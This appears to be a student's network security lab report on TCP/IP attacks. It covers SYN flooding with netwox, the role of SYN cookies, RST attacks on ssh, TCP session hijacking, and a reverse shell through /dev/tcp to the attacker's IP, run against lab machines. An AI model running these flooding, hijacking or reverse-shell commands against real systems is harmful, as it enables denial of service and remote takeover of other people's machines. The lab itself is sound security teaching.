# Lab 4 - TCP/IP Attack

## Task 1: SYN Flooding Attack

```console
$ sysctl -q net.ipv4.tcp_max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
$ netstat -tna > netstat_before_attack.txt
$ wc -l netstat_before_attack.txt
15 netstat_before_attack.txt
$ sudo sysctl -a | grep cookie
net.ipv4.tcp_syncookies = 0
```

```console
$ sudo netwox 76 -i 10.0.2.15 -p 22
```

```console
$ netstat -tna > netstat_cookie_0.txt
$ wc -l netstat_cookie_0.txt
112 netstat_cookie_0.txt
$ sudo sysctl -w net.ipv4.tcp_syncookies=1
net.ipv4.tcp_syncookies = 1
$ sudo sysctl -a | grep cookie
net.ipv4.tcp_syncookies = 1
```

During this time any client were unable to ssh to the attacked machine.

```console
$ sudo netwox 76 -i 10.0.2.15 -p 22
```

```console
$ wc -l netstat_cookie_1.txt
141 netstat_cookie_1.txt
```

It was clearly observed the machine got a lot slower during the attack when cookies was set to 1. However, it was still possible to access the attacked machine.

During this task the connection queue was verified to be reset between each step. The task was also replicated using port 23 (telnet) with the same result.

### Question: Why can the SYN cookie effectively protect the machine against the SYN flooding attack?

SYN cookies is a technical attack mitigation technique whereby the server replies to TCP SYN requests with crafted SYN-ACKs, without inserting a new record to its SYN Queue. Only when the client replies this crafted response a new record is added. This technique is used to protect the server SYN Queue from filling up under TCP SYN floods.

## Task 2: TCP RST Attacks on telnet and ssh Connections

`$ sudo netwox 78 -d Eth0`

During the attack any attempt to a TCP connection is met with `ssh_exchange_identification: read: Connection reset by peer`. If a connection was already established the connection drops on interaction with the message `packet_write_wait: Connection to 10.0.1.134 port 22: Broken pipe`.

Note: The task was only able to be performed using ssh. Didn't get a telnet connection to establish. But most plausible the same thing would occur.

## Task 3: TCP RST Attacks on Video Streaming Applications

I guess it would work to kill the TCP connection and stop the playback if there was any streaming service I could find that supported 32 bit firefox browser on Ubuntu. For some reason it didn't work on Youtube, which pretty much was the only free video streaming service I could get to play any video without being asked to "get the latest version of Firefox or Chrome" (which apparently only supports 64 bit these days).

## Task 4: TCP Session Hijacking

Once we get a hold of a TCP connection. We can use it again

```console
$ sudo netwox 40 -l 192.168.111.130 -m 192.168.111.183 -o 49869 -p 23 -i 0 -j 64 -k 6 -g -z -A -E 128 -q 70 -r 7 -H "6c"
```

## Task 5: Creating Reverse Shell using TCP Session Hijacking

On the attacking machine. Start listening for incoming messages using `nc -l 9090 -v`

On the attacked machine the commando `$ /bin/bash -i > /dev/tcp/10.0.1.134/9090 0<&1 2>&1` is run. The IP is the IP to the attacking machine and port is the one specified above.

Once the attacking machine gets a connection it instantly opens a shell connection to the attacked machine. However this shell is fragile so it is recommended to try to achieve a strong shell.
